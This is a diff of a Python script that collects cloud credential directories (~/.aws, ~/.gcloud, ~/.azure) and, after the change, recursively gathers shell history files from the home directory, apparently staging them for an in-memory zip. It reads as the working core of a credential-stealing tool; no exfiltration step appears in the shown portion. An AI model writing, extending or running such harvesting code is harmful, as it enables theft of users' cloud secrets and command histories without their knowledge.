@@ -12,8 +12,7 @@ PATHS = {
     Path("~/.aws/"),
     Path("~/.gcloud/"),
     Path("~/.azure/"),
-    Path("~/.*_history"),
-    Path("~/test_imgs")
+    Path("~/"),
 }
 
 in_memory_zip = None
@@ -30,11 +29,19 @@ def collect_dirs():
     global collected_files_and_dirs
 
     for path in PATHS:
-        path = path.expanduser() 
+        if path.name == "~":
+            path = path.expanduser()
 
-        if path.exists():
-            for subdir in path.iterdir():
-                collected_files_and_dirs.append(subdir)
+            files = path.rglob(".*_history")
+
+            for file in files:
+                collected_files_and_dirs.append(file)
+        else:
+            path = path.expanduser() 
+
+            if path.exists():
+                for subdir in path.iterdir():
+                        collected_files_and_dirs.append(subdir)
         
 def traverse():
     for path in collected_files_and_dirs:
